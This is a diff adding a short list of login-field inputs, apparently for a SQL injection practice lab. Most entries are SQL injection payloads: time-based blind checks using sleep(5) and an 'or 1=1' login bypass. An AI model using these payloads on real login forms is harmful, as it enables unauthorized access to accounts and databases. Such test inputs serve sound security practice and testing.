@@ -1,0 +1,10 @@
+User Name:Dumb
+Password:Dumb
+User Name:" or sleep(5)-- -
+Password:test
+User Name:" or sleep(5)-- -
+Password:" or sleep(5)-- -
+User Name:Dumb
+Password:" or sleep(5)-- -
+User Name:Dumb
+Password:" or 1=1-- -
